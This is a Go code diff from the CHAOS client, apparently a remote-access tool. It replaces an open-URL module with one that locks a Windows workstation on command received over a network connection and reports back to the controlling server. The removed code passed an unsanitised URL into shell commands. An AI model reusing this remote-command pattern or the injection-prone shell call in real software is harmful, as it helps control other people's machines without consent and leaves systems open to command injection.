@@ -1,35 +1,29 @@
-package open_url
+package lock_screen
 
 import (
-	"fmt"
 	log "github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/client/app/models"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
 	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
 	"net"
-	"os/exec"
 )
 
-type OpenURLUseCase struct {
+type LockScreenUseCase struct {
 	Connection net.Conn
 }
 
-func NewOpenURLUseCase(conn net.Conn) usecase.OpenURL {
-	return &OpenURLUseCase{
+func NewLockScrenUseCase(conn net.Conn) usecase.LockScreen {
+	return &LockScreenUseCase{
 		Connection: conn,
 	}
 }
 
-func (o OpenURLUseCase) Open(url string) {
+func (l LockScreenUseCase) Lock() {
 	var err error
 	switch util.DetectOS() {
 	case util.Windows:
-		_, err = util.RunCmd(fmt.Sprintf("start %s", url), 10)
-	case util.Linux:
-		err = exec.Command(fmt.Sprintf("xdg-open %s", url)).Start()
-	case util.Darwin:
-		err = exec.Command(fmt.Sprintf("open %s", url)).Start()
+		_, err = util.RunCmd("rundll32.exe user32.dll,LockWorkStation", 10)
 	default:
 		err = usecase.ErrUnsupportedPlatform
 	}
@@ -40,10 +34,10 @@ func (o OpenURLUseCase) Open(url string) {
 		errData.Message = err.Error()
 	}
 
-	if err := network.Send(o.Connection, models.Message{
-		Command: "open-url",
+	if err := network.Send(l.Connection, models.Message{
+		Command: "lockscreen",
 		Error:   errData,
 	}); err != nil {
-		log.WithField("cause", err.Error()).Error("error opening url")
+		log.WithField("cause", err.Error()).Error("error locking screen")
 	}
 }
